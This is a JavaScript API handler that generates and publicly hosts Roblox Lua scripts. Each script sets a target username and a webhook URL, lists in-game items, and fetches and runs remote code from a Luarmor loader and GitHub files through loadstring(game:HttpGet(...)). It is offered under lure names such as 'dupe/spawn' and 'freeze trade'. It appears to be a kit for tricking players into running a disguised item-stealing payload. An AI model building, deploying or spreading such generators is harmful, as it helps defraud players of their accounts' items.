```js
// api/generate.js

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({
            error: 'Method not allowed'
        });
    }

    var body = req.body || {};

    var username = body.username;
    var webhook = body.webhook;
    var mode = body.mode;
    var brainrots = body.brainrots || [];
    var skins = body.skins || [];
    var gears = body.gears || [];
    var customCode = body.customCode || '';
    var userId = body.userId;

    if (!username) {
        return res.status(400).json({
            error: 'Username is required'
        });
    }

    try {
        var script = buildScript(
            username,
            webhook,
            mode,
            brainrots,
            skins,
            gears,
            customCode
        );

        var pasteId = await saveToInternalPaste(
            script,
            'Script para ' + username,
            userId
        );

        var baseUrl =
            process.env.BASE_URL || 'https://oblivionhub.xyz';

        var rawUrl =
            baseUrl +
            '/api/paste?id=' +
            encodeURIComponent(pasteId) +
            '&raw=true';

        return res.status(200).json({
            loadstring:
                'loadstring(game:HttpGet("' +
                rawUrl +
                '"))()',

            script: script,

            pasteUrl: rawUrl,

            pasteId: pasteId,

            obfuscated: false
        });

    } catch (error) {
        console.error('Error general:', error);

        return res.status(500).json({
            error: error && error.message
                ? error.message
                : 'Internal server error'
        });
    }
}


// ============================================================
// CONSTRUIR SCRIPT
// ============================================================

function buildScript(
    username,
    webhook,
    mode,
    brainrots,
    skins,
    gears,
    customCode
) {

    function escapeLuaString(value) {
        return String(value)
            .replace(/\\/g, '\\\\')
            .replace(/"/g, '\\"')
            .replace(/\r/g, '\\r')
            .replace(/\n/g, '\\n');
    }


    function luaTable(arr) {

        if (!Array.isArray(arr) || arr.length === 0) {
            return '{}';
        }

        var result = ['{'];

        for (var i = 0; i < arr.length; i++) {
            result.push(
                '    ["' +
                escapeLuaString(arr[i]) +
                '"] = true' +
                (i < arr.length - 1 ? ',' : '')
            );
        }

        result.push('}');

        return result.join('\n');
    }


    var safeUsername =
        escapeLuaString(username);

    var safeWebhook =
        webhook
            ? escapeLuaString(webhook)
            : 'WEBHOOK_URL';


    var script = '';

    script +=
        'getgenv().TARGET_USERNAME = "' +
        safeUsername +
        '"\n';

    script +=
        'getgenv().WEBHOOK_URL = "' +
        safeWebhook +
        '"\n';

    script +=
        'getgenv().NORMAL_BRAINROTS = ' +
        luaTable(brainrots) +
        '\n';

    script +=
        'getgenv().NORMAL_BASE_SKINS = ' +
        luaTable(skins) +
        '\n';

    script +=
        'getgenv().NORMAL_GEARS = ' +
        luaTable(gears) +
        '\n';


    // ========================================================
    // LUARMOR BASE
    // ========================================================

    var GUI_BASE =
        'https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua';


    // ========================================================
    // GITHUB
    // ========================================================

    var GUI_AP =
        'https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua';

    var GUI_DUPE =
        'https://raw.githubusercontent.com/sab-api/GUIDUPE/refs/heads/main/GUIDUPE.lua';

    var GUI_SNIPER =
        'https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua';


    // ========================================================
    // NORMAL
    // ========================================================

    if (mode === 'normal') {

        script +=
            '\n' +
            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("' +
            GUI_BASE +
            '"))()\n' +
            'end)';

    }


    // ========================================================
    // ADMIN PANEL
    // LUARMOR + GUIAP.LUA
    // ========================================================

    else if (mode === 'adminpanel') {

        script +=
            '\n' +
            '-- GUI ADMIN PANEL\n' +
            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("' +
            GUI_BASE +
            '"))()\n' +
            'end)\n\n' +

            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("' +
            GUI_AP +
            '"))()\n' +
            'end)';

    }


    // ========================================================
    // DUPE / SPAWN
    // LUARMOR + GUIDUPE.LUA
    // ========================================================

    else if (mode === 'dupespawn') {

        script +=
            '\n' +
            '-- GUI DUPE / SPAWN\n' +
            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("' +
            GUI_BASE +
            '"))()\n' +
            'end)\n\n' +

            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("' +
            GUI_DUPE +
            '"))()\n' +
            'end)';

    }


    // ========================================================
    // CODE SNIPER
    // LUARMOR + SNIPER.LUA
    // ========================================================

    else if (mode === 'codesniper') {

        script +=
            '\n' +
            '-- GUI CODE SNIPER\n' +
            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("' +
            GUI_BASE +
            '"))()\n' +
            'end)\n\n' +

            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("' +
            GUI_SNIPER +
            '"))()\n' +
            'end)';

    }


    // ========================================================
    // FREEZE TRADE
    // ========================================================

    else if (mode === 'freezetrade') {

        script +=
            '\n' +
            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("' +
            GUI_BASE +
            '"))()\n' +
            'end)';

    }


    // ========================================================
    // CUSTOM
    // ========================================================

    else if (mode === 'custom') {

        script +=
            '\n' +
            'task.spawn(function()\n' +
            '    loadstring(game:HttpGet("' +
            GUI_BASE +
            '"))()\n' +
            'end)';


        if (
            customCode &&
            String(customCode).trim()
        ) {

            var formattedCustomCode =
                String(customCode)
                    .replace(/\r?\n/g, '\n    ');

            script +=
                '\n\n' +
                'task.spawn(function()\n' +
                '    ' +
                formattedCustomCode +
                '\n' +
                'end)';
        }

    }


    else {

        throw new Error(
            'Unknown generation mode: ' + mode
        );
    }


    return script;
}


// ============================================================
// GUARDAR EN PASTEFY INTERNO
// ============================================================

async function saveToInternalPaste(
    content,
    title,
    userId
) {

    var baseUrl =
        process.env.BASE_URL || 'https://oblivionhub.xyz';


    var response = await fetch(
        baseUrl + '/api/paste',
        {
            method: 'POST',

            headers: {
                'Content-Type': 'application/json'
            },

            body: JSON.stringify({
                content: content,
                title: title || 'Untitled',
                userId: userId || null,
                public: true
            })
        }
    );


    if (!response.ok) {

        var text = '';

        try {
            text = await response.text();
        } catch (_) {
            text = '';
        }

        throw new Error(
            'Paste API error ' +
            response.status +
            (text ? ': ' + text : '')
        );
    }


    var data = await response.json();


    if (!data || !data.id) {
        throw new Error(
            'Paste API did not return an ID'
        );
    }


    return data.id;
}
```
